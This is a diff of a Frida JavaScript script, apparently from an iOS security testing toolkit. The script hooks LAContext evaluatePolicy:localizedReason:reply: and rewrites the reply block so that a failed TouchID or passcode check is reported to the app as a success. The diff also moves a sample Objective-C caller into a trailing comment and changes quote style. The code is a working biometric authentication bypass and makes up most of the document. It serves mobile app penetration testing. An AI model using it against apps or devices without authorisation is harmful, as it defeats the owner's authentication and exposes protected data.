@@ -1,30 +1,5 @@
-// LAContext *myContext = [[LAContext alloc] init];
-// NSError *authError = nil;
-// NSString *myLocalizedReasonString = @"Please authenticate.";
-
-// if ([myContext canEvaluatePolicy:LAPolicyDeviceOwnerAuthentication error:&authError]) {
-//     [myContext evaluatePolicy:LAPolicyDeviceOwnerAuthentication
-//                 localizedReason:myLocalizedReasonString
-//                         reply:^(BOOL success, NSError *error) {
-//                             if (success) {
-
-//                                 dispatch_async(dispatch_get_main_queue(), ^{
-//                                     [self performSegueWithIdentifier:@"LocalAuthSuccess" sender:nil];
-//                                 });
-
-//                             } else {
-
-//                                 dispatch_async(dispatch_get_main_queue(), ^{
-//                                     UIAlertView *alertView = [[UIAlertView alloc] initWithTitle:@"Error"
-//                                                                                         message:error.description
-//                                                                                         delegate:self
-//                                                                                 cancelButtonTitle:@"OK"
-//                                                                                 otherButtonTitles:nil, nil];
-//                                     [alertView show];
-//                                     // Rather than show a UIAlert here, use the error to determine if you should push to a keypad for PIN entry.
-//                                 });
-//                             }
-//                         }];
+// Attempts to 'bypass' TouchID by responding with a successfull
+// operating system response to evaluatePolicy.
 
 var resolver = new ApiResolver('objc');
 var LAContext_evaluatePolicy_localizedReason_reply = {}
@@ -40,9 +15,9 @@ resolver.enumerateMatches('-[LAContext evaluatePolicy:localizedReason:reply:]', 
 if (LAContext_evaluatePolicy_localizedReason_reply.address) {
 
     send(JSON.stringify({
-        status: "success",
+        status: 'success',
         error_reason: NaN,
-        type: "touchid-bypass",
+        type: 'touchid-bypass',
         data: 'Hooked ' + LAContext_evaluatePolicy_localizedReason_reply.name
     }));
 
@@ -52,9 +27,9 @@ if (LAContext_evaluatePolicy_localizedReason_reply.address) {
             // localizedReason:
             var reason = new ObjC.Object(args[3]);
             send(JSON.stringify({
-                status: "success",
+                status: 'success',
                 error_reason: NaN,
-                type: "touchid-bypass",
+                type: 'touchid-bypass',
                 data: 'Localized Reason for auth requirement: ' + reason.toString()
             }));
 
@@ -67,18 +42,18 @@ if (LAContext_evaluatePolicy_localizedReason_reply.address) {
 
             original_block.implementation = function (success, error) {
                 send(JSON.stringify({
-                    status: "success",
+                    status: 'success',
                     error_reason: NaN,
-                    type: "touchid-bypass",
+                    type: 'touchid-bypass',
                     data: 'OS authentication success response: ' + success
                 }));
 
                 if (!success == true) {
 
                     send(JSON.stringify({
-                        status: "success",
+                        status: 'success',
                         error_reason: NaN,
-                        type: "touchid-bypass",
+                        type: 'touchid-bypass',
                         data: 'Marking OS response as True instead'
                     }));
 
@@ -90,9 +65,9 @@ if (LAContext_evaluatePolicy_localizedReason_reply.address) {
                 saved_reply_block(success, error);
 
                 send(JSON.stringify({
-                    status: "success",
+                    status: 'success',
                     error_reason: NaN,
-                    type: "touchid-bypass",
+                    type: 'touchid-bypass',
                     data: 'TouchID bypass run complete'
                 }));
 
@@ -100,3 +75,33 @@ if (LAContext_evaluatePolicy_localizedReason_reply.address) {
         }
     });
 }
+
+// -- Sample Objective-C
+//
+// LAContext *myContext = [[LAContext alloc] init];
+// NSError *authError = nil;
+// NSString *myLocalizedReasonString = @"Please authenticate.";
+
+// if ([myContext canEvaluatePolicy:LAPolicyDeviceOwnerAuthentication error:&authError]) {
+//     [myContext evaluatePolicy:LAPolicyDeviceOwnerAuthentication
+//               localizedReason:myLocalizedReasonString
+//                         reply:^(BOOL success, NSError *error) {
+//                             if (success) {
+
+//                                 dispatch_async(dispatch_get_main_queue(), ^{
+//                                     [self performSegueWithIdentifier:@"LocalAuthSuccess" sender:nil];
+//                                 });
+
+//                             } else {
+
+//                                 dispatch_async(dispatch_get_main_queue(), ^{
+//                                     UIAlertView *alertView = [[UIAlertView alloc] initWithTitle:@"Error"
+//                                                                                         message:error.description
+//                                                                                         delegate:self
+//                                                                                cancelButtonTitle:@"OK"
+//                                                                                otherButtonTitles:nil, nil];
+//                                     [alertView show];
+//                                     // Rather than show a UIAlert here, use the error to determine if you should push to a keypad for PIN entry.
+//                                 });
+//                             }
+//                         }];
